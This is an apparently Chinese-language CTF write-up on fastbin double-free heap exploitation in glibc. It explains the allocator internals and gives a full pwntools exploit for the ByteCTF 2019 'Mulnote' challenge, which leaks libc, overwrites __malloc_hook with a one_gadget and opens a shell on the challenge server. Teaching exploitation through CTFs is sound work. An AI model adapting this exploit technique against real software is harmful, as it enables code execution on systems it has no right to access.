@@ -1,0 +1,142 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>最近一直在学习堆的利用，我是按照蓝莲花战队队员Atum 的规划路线进行学习的，感觉大佬介绍的方法和路线相当好，让我这个萌新成长了不少。我将继续按照他的这个规划走下去，当然，肯定少不了自己的摸索，毕竟规划只是一个方向，最重要的还是自己去实践。我会继续把我的学习过程和心得分享出来，方便那些像我这样的菜鸟可以更快的成长起来。值得注意的是，在学习堆的漏洞利用之前，应该先读一读《glibc内存管理ptmalloc源代码分析.pdf》的内容。</p>
+<h1 data-content="1" id="c2451603b9d14e96a0beb63037126b70">fastbin double free</h1>
+<h2 data-content="1" id="173e3239e57404175ec8568a906a5088">double free 原理</h2>
+<p>简单的说，double free 是任意地址写的一种技巧，指堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，有什么用呢？利用这个漏洞，我们可以达成任意地址写的目的。</p>
+<p>为了照顾萌新，我再温习一下基本概念，大佬可以忽视。</p>
+<p>malloc_chunk 的源码如下：</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="p">{</span>
+<span class="n">INTERNAL_SIZE_T</span> <span class="n">prev_size</span><span class="p">;</span>  <span class="cm">/*前一个chunk的大小*/</span>
+<span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>       <span class="cm">/*当前chunk的大小*/</span>
+<span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="o">*</span> <span class="n">fd</span><span class="p">;</span>   <span class="cm">/*指向前一个释放的chunk*/</span>
+<span class="k">struct</span> <span class="n">malloc_chunk</span> <span class="o">*</span> <span class="n">bk</span><span class="p">;</span>   <span class="cm">/*指向后一个释放的chunk*/</span>
+<span class="p">}</span>
+</pre></div>
+<p>《glibc内存管理ptmalloc源代码分析.pdf》中要用到的关于fastbin回收机制相关知识点如下：</p>
+<h3 data-content="1" id="98d73a485a0ab605f676dcad419fe603">1.free函数</h3>
+<p>free()函数free掉chunk时先判断 chunk 的大小和所处的位置，若 chunk_size &lt;= max_fast，并且 chunk 并不位于 heap 的顶部，也就是说并不与 top chunk 相邻，则将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中，释放便结束了，程序从 free()函数中返回。</p>
+<h3 data-content="1" id="e432d6da4020fa54d7c040b1ee11cffd">2.ptmalloc 的响应</h3>
+<p>判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为 64B)， 如果是的话，先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。</p>
+<h2 data-content="1" id="8934b9fa44d12c705b9fcc0beecef525">double free 利用思路</h2>
+<p>fastbin 是 LIFO 的数据结构，使用单向链表实现。根据fastbin 的特性，释放的chunk 会以单向链表的形式回收到fastbin 里面，我们先free同一块chunk 两次，然后malloc 大小一样对的chunk，此时这个内存块还是在fastbin上面的，这时我们就可以肆意修改fd指针了，让它指向我们想指向的地方，然后再进行2次malloc大小一样的堆块，我们可以分配到fd所指的的内存区域块，即我们想要控制的内存块。</p>
+<p>但操作系统有相应的检查，直接free两次是不行的，但根据它检查的特性，我们只要伪造一个chunk 就可以绕过检查，绕过检查的原理如下图所示，菜鸟我画的，请大师傅们别喷哈。参考的资料<a href="https://blog.csdn.net/zh_explorer/article/details/80307030" target="_blank">https://blog.csdn.net/zh_explorer/article/details/80307030</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190913093726-0a950dac-d5c7-1.png"/></p>
+<p>其中，chunk1 是要double free 的内存块，chunk2 是我们伪造的堆块，第一个单向链表是进行三次的free后fastbin 链表，第二个单向链表经过malloc （chunk1的大小），第三个单向链表经过了三次malloc，要注意的是每次malloc 都应该要返回相应的chunk才能达到我们的目的，所以每次malloc 的大小最好是一样的 。</p>
+<h2 data-content="1" id="f1c9cd3dafdb5a89107fcc013e74ff9d">实例：ByteCTF 2019  Mulnote</h2>
+<p>这道题完全是为学习double free 原理提供的，漏洞清晰，套路明显。</p>
+<p>首先checksec，开启NX</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL</code></pre>
+<p>题目提供了一个选择栏目</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190913093752-19fea690-d5c7-1.png"/></p>
+<p>存在double free 漏洞的函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190913093955-63354ad0-d5c7-1.png"/></p>
+<p>思路分析：多线程，存在double free 漏洞，所以可以先申请一个0x80 的chunk0，释放后show （chunk0），泄露libc 地址，然后利用double free 实现任意地址写，然后修改__malloc_hook 为execue。</p>
+<h3 data-content="1" id="a5f792226ca8e77c6d5fb2b062f02e40">1.泄露libc 地址</h3>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'abc'</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[*]note[0]:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="k">print</span>  <span class="s2">"address:"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+
+<span class="n">libc_Addr</span> <span class="o">=</span> <span class="n">address</span><span class="o">-</span><span class="p">(</span><span class="mh">0x7ffff7bb4b78</span><span class="o">-</span><span class="mh">0x7ffff77f0000</span><span class="p">)</span>
+</pre></div>
+<p>这里利用了unsorted bin 的特性泄露libc地址。</p>
+<h3 data-content="1" id="2cc3ee25a0c73e5b255bb2b26aa5e0ea">2.利用double free,修改__malloc_hook</h3>
+<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh'</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh'</span><span class="p">)</span> <span class="c1">#2</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">hackadd</span><span class="p">))</span> <span class="c1">#3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="c1">#4</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">hackadd</span> <span class="p">))</span> <span class="c1">#5</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0xb</span><span class="o">+</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one</span><span class="p">))</span>
+</pre></div>
+<p>这里add(0x60,'a'<em>0xb+'a'</em>0x8+p64(one)) 的时候要注意调试，因为我们想控制的malloc _hook 的这块内存必须要满足chunk的size 域才能成功的malloc，这里需要自己动手去实践，看malloc_hook 函数附件的内存区域是否满足。这里贴出我调试的满足区域。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190913093903-447fc80e-d5c7-1.png"/></p>
+<p>所以：hackadd = 0x7ffff7bb4b10 - 0x20 - 0x3 = __malloc_hook - 0x20 - 0x3</p>
+<p>完整exp：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+
+<span class="c1">#p = process("./mulnote")</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"112.126.101.96"</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so"</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">leng</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"C"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"size&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">leng</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"note&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[Q]uit</span><span class="se">\n</span><span class="s2">&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"C"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[Q]uit</span><span class="se">\n</span><span class="s2">&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"R"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"index&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[Q]uit</span><span class="se">\n</span><span class="s2">&gt;"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"S"</span><span class="p">)</span>
+
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'abc'</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p,'b *0x5555555558ae')</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[*]note[0]:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="k">print</span>  <span class="s2">"address:"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+
+<span class="n">libc_Addr</span> <span class="o">=</span> <span class="n">address</span><span class="o">-</span><span class="p">(</span><span class="mh">0x7ffff7bb4b78</span><span class="o">-</span><span class="mh">0x7ffff77f0000</span><span class="p">)</span>
+
+<span class="n">__malloc_hook</span><span class="o">=</span><span class="n">libc_Addr</span><span class="o">+</span><span class="n">a</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__malloc_hook'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_Addr</span>
+<span class="k">print</span>  <span class="s2">"system :"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="c1">#0x7ffff7835390#\0x45216#0x4526a0xf02a4#0xf1147</span>
+<span class="n">one</span> <span class="o">=</span>  <span class="n">libc_Addr</span><span class="o">+</span><span class="mh">0x4526a</span><span class="c1">#0x45216#0x4526a#0xf02a4#0xf1147</span>
+<span class="n">hackadd</span> <span class="o">=</span> <span class="n">__malloc_hook</span><span class="o">-</span><span class="mh">0x20</span><span class="o">-</span><span class="mh">0x3</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh'</span><span class="p">)</span> <span class="c1">#1</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh'</span><span class="p">)</span> <span class="c1">#2</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">free_got</span> <span class="o">=</span> <span class="mh">0x201F58</span>
+<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x202010</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">hackadd</span><span class="p">))</span> <span class="c1">#3</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> <span class="c1">#4</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">hackadd</span> <span class="p">))</span> <span class="c1">#5</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0xb</span><span class="o">+</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one</span><span class="p">))</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#add(0x60,'a'*0xb)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"C"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"size&gt;"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="b46b2268892b9a54806fcfb8cec5507c">学习体会</h2>
+<p>堆的漏洞利用真的是一门艺术，感觉基础知识比较重要，如果不熟悉相关数据结构，到后续的堆喷和堆风水等内容学习会比较吃力，所以建议真的要好好把基础知识学懂弄通。fastbin double free 只是刚刚开始而已，后续还会分享更多精彩内容。题目和学习资料见附件。</p>
+</div>
+</div>
